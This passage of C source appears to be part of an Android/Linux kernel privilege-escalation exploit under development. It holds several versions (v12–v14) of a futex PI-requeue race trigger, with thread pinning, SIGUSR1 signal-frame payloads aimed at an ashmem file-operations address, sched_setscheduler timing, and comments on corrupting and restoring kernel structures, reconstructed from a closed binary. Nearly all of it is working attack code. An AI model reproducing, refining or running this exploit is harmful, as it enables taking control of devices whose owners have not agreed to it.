  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sched_setattr_result_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v12, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v12] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v12] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v12] verify callback never invoked (real gate "
                     "did not open this run)\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v12_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v12] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v12_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: see futex_trigger.h's run_futex_trigger_v13_cb comment --
 * bisection axis B alone: SIGUSR2+300ms delay to owner KEPT (identical
 * to waiter_thread_fn_v9), busy-spin (v12's byte-accurate iteration
 * count) swapped in for the usleep-poll. */
static void *waiter_thread_fn_v13(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v13] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v13] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v13] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* axis A: kept, identical to v9. */
      int otid = atomic_load(&owner_tid_g);
      if (otid != 0) {
        long kret = syscall(SYS_tgkill, getpid(), otid, SIGUSR2);
        fprintf(stderr,
                "[futex-v13] tgkill(owner tid=%d, SIGUSR2) ret=%ld errno=%d\n",
                otid, kret, errno);
      }
      usleep(300000);
      atomic_store(&g_sigusr1_done, 1);

      /* axis B: swapped to v12's busy-spin. */
      for (uint64_t spins = 0;
           spins < 0x3b9ac9ffULL && !atomic_load(&g_sched_setattr_done);
           spins++) {
        __asm__ volatile("yield" ::: "memory");
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v13] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v13] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v13] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < 2000 && !atomic_load(&owner_acquired);
       spins++) {
    usleep(1000);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v13_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v13] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v13, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v13] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v13] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v13] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v13_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v13] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v13_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: FUN_00104300 @ 0x4300-0x44f0.  The consumer is a persistent
 * state machine.  In particular getenv()/atoi() and the cycle delay
 * are evaluated only after a new positive state is observed. */
static void *consumer_thread_fn_v14(void *arg) {
  (void)arg;
  pin_to_cpu(1);
  atomic_store(&g_v14_state.secondary_0, 1); /* closed consumer_ready */

  int previous_state = 0;
  while (!atomic_load(&g_v14_state.stop)) {
    int state = atomic_load(&g_v14_state.state);
    int tid = atomic_load(&g_v14_state.waiter_tid);

    if (state == 0) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    if (state == -1) {
      atomic_store(&g_v14_state.gate, 1);
      while (!atomic_load(&g_v14_state.stop) &&
             atomic_load(&g_v14_state.state) == -1) {
        __asm__ volatile("yield" ::: "memory");
      }
      continue;
    }

    if (state == previous_state) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    previous_state = state;

    if (atomic_load(&g_v14_state.stop) ||
        atomic_load(&g_v14_state.state) != state) {
      continue;
    }

    /* Publish the conservative no-retry state before timing delays. Keeping
     * this store out of the immediate sched_setattr window preserves the
     * closed consumer's critical instruction timing. */
    int publishes_mutation =
        g_sched_mutation_state != NULL && state == g_sched_mutation_sequence;
    if (publishes_mutation) {
      __atomic_store_n(g_sched_mutation_state, g_sched_pending_state,
                       __ATOMIC_RELEASE);
    }

    int delay_us = atomic_load(&g_v14_state.delay_us);
    if (delay_us > 0) {
      usleep((useconds_t)delay_us);
    }
    spin_wait_cycles(g_v14_delay_cycles);

    if (atomic_load(&g_v14_state.stop) ||
        atomic_load(&g_v14_state.state) != state) {
      continue;
    }

    atomic_fetch_add_explicit(&g_v14_state.attempt_count, 1,
                              memory_order_relaxed);
    /* Item 2: quiet the sibling CPUs immediately before the corruption is
     * created (idempotent; the post-trigger callback reopens them after the
     * fops restore). */
    oss_cpu_quiet_begin();
    errno = 0;
    /* DiamondFox consumer_thread @ 0x10554 uses syscall 0x77
     * (sched_setscheduler), not sched_setattr. It alternates policy 0/3 and
     * passes sched_priority=0. A successful renice returns 0 too, but never
     * enters the vulnerable scheduler policy-change path. */
    int old_policy = atomic_load(&g_v14_consumer_policy);
    int policy = old_policy == SCHED_BATCH ? SCHED_OTHER : SCHED_BATCH;
    struct sched_param param = {.sched_priority = 0};
    long ret = syscall(SYS_sched_setscheduler, tid, policy, &param);
    atomic_store(&g_v14_last_sched_ret, ret);
    atomic_store(&g_v14_last_sched_errno, errno);
    if (publishes_mutation) {
      __atomic_store_n(g_sched_mutation_state, g_sched_mutated_state,
                       __ATOMIC_RELEASE);
    }
    if (ret == 0) {
      atomic_store(&g_v14_consumer_policy, policy);
      atomic_fetch_add_explicit(&g_v14_state.success_count, 1,
                                memory_order_relaxed);
    }
    atomic_store(&g_v14_state.sched_done, 1);
    atomic_store(&g_v14_state.state, 0);
  }
  return NULL;
}

int futex_v14_deliver_persistent_phase(const struct oss_futex_phase *phase,
                                       uint64_t ghost_task) {
  if (!phase || !phase->sequence || !ghost_task ||
      atomic_load(&g_v14_state.stop) ||
      (int)syscall(SYS_gettid) != atomic_load(&g_v14_state.waiter_tid) ||
      atomic_load(&g_v14_state.state) != 0) {
    return 0;
  }

  int success_before = atomic_load(&g_v14_state.success_count);
  atomic_store(&g_v14_state.sched_done, 0);
  sigusr1_build_waiter_phase(phase->parent, phase->right, 0, ghost_task,
                             phase->lock, 0);
  if (!sigusr1_fire_and_wait()) return 0;

  atomic_store_explicit(&g_v14_state.state, (int)phase->sequence,
                        memory_order_release);
  for (uint64_t spins = 0;
       spins <= 0x3b9ac9ffULL &&
       !atomic_load_explicit(&g_v14_state.sched_done, memory_order_acquire);
       spins++) {
    __asm__ volatile("yield" ::: "memory");
  }
  int completed = atomic_load_explicit(&g_v14_state.sched_done,
                                       memory_order_acquire);
  int success_after = atomic_load(&g_v14_state.success_count);
  atomic_store(&g_v14_state.state, 0);
  return completed && success_after > success_before;
}

/* source: FUN_00103e18 @ 0x3f2c-0x4164. WAIT_REQUEUE_PI's return is
 * not filtered. The waiter publishes -1, waits for the consumer gate,
 * builds/fires SIGUSR1, then publishes 1 and stays runnable until the
 * separate consumer finishes sched_setattr. */
static void *waiter_thread_fn_v14(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&g_v14_state.waiter_tid, tid);

  /* Closed order: sigaction is owned by this thread and completes
   * before its first PI futex operation. */
  if (!sigusr1_install_handler()) {
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }

  if (futex_op(&g_v14_state.pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) !=
      0) {
    atomic_store(&g_v14_state.stop, 1);
    atomic_store(&g_v14_state.route_done, 1);
    return NULL;
  }

  atomic_store(&g_v14_state.waiter_ready, 1);
  while (!atomic_load(&g_v14_state.owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += g_futex_wait_sec;

  atomic_store(&g_v14_state.waiter_waiting, 1);
  (void)futex_op(&g_v14_state.wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                 &g_v14_state.pi_target, 0);
  futex_v14_dbg("wait-requeue-pi-returned");

  atomic_store(&g_v14_state.sched_done, 0);
  atomic_store(&g_v14_state.gate, 0);
  atomic_store(&g_v14_state.success_count, 0);
  atomic_store(&g_v14_state.attempt_count, 0);
  /* 0x3f44: the waiter clears the 50000-us initial value before
   * publishing state=-1. The default consumer pass therefore does not
   * sleep between rt_sigreturn and sched_setattr. */
  atomic_store(&g_v14_state.delay_us, 0);
  atomic_store(&g_v14_state.stop, 0);
  atomic_store(&g_v14_state.state, -1);

  for (uint64_t spins = 0;
       spins <= 0x05f5e0ffULL && !atomic_load(&g_v14_state.gate);
       spins++) {
    __asm__ volatile("yield" ::: "memory");
  }

  int gate_seen = atomic_load(&g_v14_state.gate);
  int sig_ok = 0;
  if (gate_seen && atomic_load(&g_use_sigusr1)) {
    if (g_v14_neutral_settle) {
      /* Closed phase 1 is not a signal-free witness pass. It installs a
       * zeroed waiter whose task/lock point at the prepared ghost BSS, then
       * rt_sigreturn exposes that image before state=1 releases sched_setattr.
       * Skipping SIGUSR1 leaves the PI tree unshaped and rb_erase follows a
       * stale userspace-pattern child (observed 0x40010001 on ZZHL). */
      sigusr1_build_waiter_phase(0, 0, 0, g_v14_ghost_task,
                                 g_v14_initial_lock, 0);
      sig_ok = sigusr1_fire_and_wait();
    } else {
      sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
      sig_ok = sigusr1_fire_and_wait();
    }
  }
  atomic_store(&g_v14_sig_ok, sig_ok);

  if (sig_ok) {
    uint64_t spin_epoch;
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(spin_epoch));
    (void)spin_epoch;
    atomic_store(&g_v14_state.state, 1);

    for (uint64_t spins = 0;
         spins <= 0x3b9ac9ffULL &&
             !atomic_load(&g_v14_state.sched_done);
         spins++) {
      __asm__ volatile("yield" ::: "memory");
    }

    atomic_store(&g_v14_state.state, 0);
    (void)atomic_load(&g_v14_state.attempt_count);
    if (atomic_load(&g_v14_state.success_count) >= 1 && g_post_cb != NULL) {
      int cb_ret = g_post_cb(g_post_cb_ctx);
      atomic_store(&g_cb_result, cb_ret);
      atomic_store(&g_cb_invoked, 1);
    }
  } else {
    atomic_store(&g_v14_state.state, 0);
  }

  atomic_store(&waiter_ok, 1);
  atomic_store(&g_v14_state.state, 0);
  atomic_store(&g_v14_state.stop, 1);
  atomic_store(&g_v14_state.route_done, 1);
  /* Closed FUN_00103e18 publishes all three flags before issuing the
   * separately prepared FUTEX_UNLOCK_PI syscall. */
  (void)futex_op(&g_v14_state.pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&g_v14_state.owner_acquired)) {
    usleep(1000);
  }
  return NULL;
}

/* FUN_00104274.  Dedicated v14 owner keeps diagnostics and SIGUSR2
 * experiment state out of the exact path. */
static void *owner_thread_fn_v14(void *arg) {
  (void)arg;
  int owner_tid = (int)syscall(SYS_gettid);
  atomic_store(&owner_tid_g, owner_tid);
  fprintf(stderr, "[futex-v14] owner tid=%d (pi-repair victim candidate)\n",
          owner_tid);
  if (futex_op(&g_v14_state.pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) !=
      0) {
    return NULL;
  }
  while (!atomic_load(&g_v14_state.waiter_ready)) {
    usleep(1000);
  }
  atomic_store(&g_v14_state.owner_started, 1);
  (void)futex_op(&g_v14_state.pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&g_v14_state.owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  g_futex_dbg_t0 = futex_now_ms();
  g_futex_dbg_last = g_futex_dbg_t0;
  g_futex_wait_sec = futex_env_int_clamped("FUTEX_WAIT_SEC", WAIT_SEC, 1, WAIT_SEC);
  fprintf(stderr, "[futex-v14] FUTEX_WAIT_SEC=%d (default %d)\n",
          g_futex_wait_sec, WAIT_SEC);
  if (!g_v14_neutral_settle) oss_pipe_rw_reset();
  /* Resolve environment/libc work before either critical thread exists.
   * The consumer path after the waiter's rt_sigreturn must contain no
   * getenv/atoi calls before sched_setattr. */
  g_v14_delay_cycles = supervisor_attempt_delay_cycles();
  g_v14_state.wait = 0;
  g_v14_state.pi_target = 0;
  g_v14_state.pi_chain = 0;
  atomic_store(&g_v14_state.waiter_tid, 0);
  atomic_store(&g_v14_state.route_done, 0);
  atomic_store(&g_v14_state.waiter_ready, 0);
  atomic_store(&g_v14_state.owner_started, 0);
  atomic_store(&g_v14_state.waiter_waiting, 0);
  atomic_store(&g_v14_state.sched_done, 0);
  atomic_store(&g_v14_state.gate, 0);
  atomic_store(&g_v14_state.owner_acquired, 0);
  atomic_store(&g_v14_state.attempt_count, 0);
  atomic_store(&g_v14_state.success_count, 0);
  atomic_store(&g_v14_state.stop, 0);
  /* FUN_001044f4 initializes DAT_0010d768 to 50000 before creating the
   * threads; FUN_00103e18 clears it after WAIT_REQUEUE_PI returns. */
  atomic_store(&g_v14_state.delay_us, 50000);
  atomic_store(&g_v14_state.state, 0);
  atomic_store(&g_v14_state.secondary_0, 0);
  atomic_store(&g_v14_state.secondary_1, 0);
  atomic_store(&g_v14_sig_ok, 0);
  atomic_store(&g_v14_last_sched_ret, -2);
  atomic_store(&g_v14_last_sched_errno, 0);
  atomic_store(&g_v14_consumer_policy, SCHED_OTHER);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  /* Closed run_main_route_threads installs a distinct signal-10 handler
   * before creating threads. No SA_RESTART: it must interrupt the waiter's
   * WAIT_REQUEUE_PI after the main-thread requeue operation. */
  struct sigaction release_sa;
  memset(&release_sa, 0, sizeof(release_sa));
  release_sa.sa_handler = v14_release_handler;
  sigemptyset(&release_sa.sa_mask);
  if (sigaction(SIGUSR1, &release_sa, NULL) != 0) return 0;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v14, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v14, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v14, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&g_v14_state.waiter_waiting) ||
         !atomic_load(&g_v14_state.owner_started) ||
         !atomic_load(&g_v14_state.secondary_0)) {
    usleep(1000);
  }
  futex_v14_dbg("threads-ready");

  usleep(100000);
  futex_v14_dbg("post-100ms-pause");

  errno = 0;
  long requeue_ret =
      futex_op(&g_v14_state.wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
               (void *)1, &g_v14_state.pi_target, 0);
  int requeue_errno = errno;
  futex_v14_dbg("post-cmp-requeue-pi");

  /* DiamondFox order: CMP_REQUEUE_PI; f_wait=1; DMB; tgkill(waiter,SIGUSR1).
   * This release happens at ~100ms. Waiting for ETIMEDOUT changes the kernel
   * rtmutex state and makes every later scheduler call a harmless success. */
  __atomic_store_n(&g_v14_state.wait, 1, __ATOMIC_RELEASE);
  __sync_synchronize();
  int waiter_tid = atomic_load(&g_v14_state.waiter_tid);
  errno = 0;
  long release_ret = syscall(SYS_tgkill, getpid(), waiter_tid, SIGUSR1);
  int release_errno = errno;
  fprintf(stderr,
          "[futex-v14] release ret=%ld errno=%d tid=%d signal=%d\n",
          release_ret, release_errno, waiter_tid, SIGUSR1);

  while (!atomic_load(&g_v14_state.route_done)) {
    oss_pipe_rw_service_pending();
    usleep(10000);
  }
  oss_pipe_rw_service_pending();
  futex_v14_dbg("route-done");

  fprintf(stderr, "[futex-v14] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  fprintf(stderr,
          "[futex-v14] outcome gate=%d sig_ok=%d attempts=%d successes=%d "
          "sched_ret=%ld sched_errno=%d callback=%d result=%d\n",
          atomic_load(&g_v14_state.gate), atomic_load(&g_v14_sig_ok),
          atomic_load(&g_v14_state.attempt_count),
          atomic_load(&g_v14_state.success_count),
          atomic_load(&g_v14_last_sched_ret),
          atomic_load(&g_v14_last_sched_errno), atomic_load(&g_cb_invoked),
          atomic_load(&g_cb_result));

  /* Item 2 safety net: the window is over once the route finished. The
   * callback normally reopens the CPUs after its fops restore; this covers the
   * paths where the callback failed before reaching that point (idempotent). */
  oss_cpu_quiet_end();

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v14] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v14] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v14_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  return run_futex_trigger_v14_full_staged(page_base, ashmem_misc_fops_addr,
                                            NULL, 0, 0, post_trigger_cb, ctx);
}

int run_futex_trigger_v14_full_staged(
    uint64_t page_base, uint64_t ashmem_misc_fops_addr,
    int32_t *mutation_state, int32_t pending_state, int32_t mutated_state,
    futex_post_trigger_cb post_trigger_cb, void *ctx) {
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  g_sched_mutation_state = mutation_state;
  g_sched_pending_state = pending_state;
  g_sched_mutated_state = mutated_state;
  g_sched_mutation_sequence = 1;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v14_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  g_sched_mutation_state = NULL;
  g_sched_mutation_sequence = 0;
  return ret;
}

int run_futex_trigger_v14_preflight_staged(
    uint64_t ghost_task, uint64_t initial_lock,
    int32_t *mutation_state, int32_t pending_state, int32_t mutated_state,
    futex_post_trigger_cb post_trigger_cb, void *ctx) {
  g_v14_neutral_settle = 1;
  g_v14_ghost_task = ghost_task;
  g_v14_initial_lock = initial_lock;
  g_sched_mutation_state = mutation_state;
  g_sched_pending_state = pending_state;
  g_sched_mutated_state = mutated_state;
  g_sched_mutation_sequence = 2;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v14_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  g_sched_mutation_state = NULL;
  g_sched_mutation_sequence = 0;
  g_v14_neutral_settle = 0;
  return ret;
}
